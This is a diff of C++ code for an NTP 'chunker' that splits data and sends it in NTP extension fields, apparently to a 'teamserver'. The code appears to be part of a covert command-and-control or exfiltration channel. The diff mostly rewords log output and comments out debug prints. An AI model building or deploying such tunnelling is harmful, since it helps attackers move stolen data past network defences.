@@ -19,52 +19,32 @@ std::vector<uint8_t> size_tToBytes(size_t value) {
 }
 
 std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField) {
-	std::cout << "----------------------" << std::endl;
-	std::cout << "Sending NTP Packet(s)	" << std::endl;
-	std::cout << "----------------------" << std::endl;
+	std::cout << "======================" << std::endl;
+	std::cout << "Started Chunking		" << std::endl;
+	std::cout << "======================" << std::endl;
 	//packetDebugger(data);
 	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
-	uint64_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data
-	//but who knows. Rather be safe than sorry.
-	
+	uint64_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
+	std::vector<uint8_t> responseDataBuffer = {};
+	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder
 
-
-	std::cout << "[?] Chunker started on data the size of : " << dataSize << std::endl;
-
+	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
+	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
+	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
 
 	/*
 	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes. 
 	*/
 	auto packetToNotifyServerOfSize = NTPPacket();
-
-
 	auto incomingSize = size_tToBytes(dataSize);
 	packetToNotifyServerOfSize.addExtensionField(
 		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
 		incomingSize
 	);
-
 	std::cout << "[?] Sending size packet " << std::endl;
-	//std::cout << "[?] Packet to notify server of size: " << std::endl;
-	//printHexVectorPacket(packetToNotifyServerOfSize.getPacket());
-
 	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
 	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
 	
-	//extract session ID
-	//std::vector<uint8_t> sessionID;
-	////48 for init packet, 4 past response
-	//sessionID.insert(sessionID.end(), response.begin() + 48 + 4, response.end());
-	//std::cout << "[?] Session ID: " << std::endl;
-	//printHexVector(sessionID);
-
-	//2. Start chunking process
-	std::cout << "[?] Starting chunking process: --------------------" << std::endl;
-
-	std::vector<uint8_t> responseDataBuffer = {};
-	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder
-	std::cout << "[?] Data of size " << dataSize << " will need " << amountOfChunks << " chunks to send. Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
-
 	// Loop over each chunk index
 	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
 		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
@@ -72,9 +52,8 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 
 		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);
 
-		std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
-		printHexVector(chunkData);
-
+		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
+		//printHexVector(chunkData);
 
 		//creat ntp packet first
 		auto packet = NTPPacket();
@@ -86,9 +65,8 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 		//pass full ntp packet 
 		std::vector < uint8_t> packet_bytes = packet.getPacket();
 
-		//Print that we've received  a packet, and then print debug items below it
+		//Print that we're sending a packet, adn what type of packet it is.
 		std::cout << "----------------------" << std::endl;
-		//std::cout << "Sending NTP Packet	" << std::endl;
 		std::cout << "Sending NTP Packet [" << i+1 << "/" << amountOfChunks << "]" << std::endl;
 		std::cout << "----------------------" << std::endl;
 		//run the debugger directly on the incoming respnose packet
@@ -143,14 +121,6 @@ int main() {
 	NTPPacketParser packetParser = NTPPacketParser(packet_bytes);
 	std::vector<uint8_t> extensionData = packetParser.getExtensionData();
 
-	//std::cout << "[?] extensionData (From Main):";
-	//printHexVector(extensionData);
-	//std::cout << std::endl;
-
-
-	//print full packet
-	//packet.printPacket();
-	//printHexVectorPacket(packet_bytes);
 	chunker(packet_bytes, NtpExtensionField::dataForTeamserver);
 
 }
